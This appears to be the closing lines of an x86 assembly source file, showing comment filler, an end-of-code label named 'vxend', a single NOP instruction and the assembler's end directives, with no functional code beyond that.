;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
vxend:
nop ;For moving the code for testing

end start
end
